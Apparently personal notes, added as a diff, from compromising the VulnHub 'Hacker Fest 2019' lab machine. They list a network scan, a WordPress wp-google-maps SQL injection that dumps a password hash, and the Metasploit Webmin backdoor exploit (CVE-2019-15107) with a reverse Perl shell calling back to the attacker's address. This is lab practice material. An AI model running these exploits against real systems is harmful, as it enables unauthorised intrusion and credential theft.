@@ -1,0 +1,73 @@
+netdiscover 192.168.1.0/24
+
+http://192.168.1.106/
+
+Portas e serviços:
+21/tcp    open  ftp      vsftpd 3.0.3
+22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
+10000/tcp open  ssl/http MiniServ 1.890 (Webmin httpd)
+
+
+Plugin Wordpress:
+Plugin wp-google-maps 
+https://www.exploit-db.com/exploits/44883
+
+
+Auxiliary:
+auxiliary/admin/http/wp_google_maps_sqli 
+192.168.1.106:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
+
+
+Searchsploit webmin
+webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit) 
+
+
+Exploit:
+exploit/linux/http/webmin_backdoor
+payload/cmd/unix/reverse_perl
+
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+msf5 exploit(linux/http/webmin_backdoor) > set forceexploit true
+
+msf5 exploit(linux/http/webmin_backdoor) > exploit
+
+Links:
+https://www.vulnhub.com/entry/hacker-fest-2019,378/
+https://www.exploit-db.com/exploits/44883
+https://nvd.nist.gov/vuln/detail/CVE-2019-15107
+https://www.exploit-db.com/exploits/47230
+https://www.vulnhub.com/entry/hacker-fest-2019,378/
+https://www.youtube.com/watch?v=2-9QX97B9TE&t=62s
+
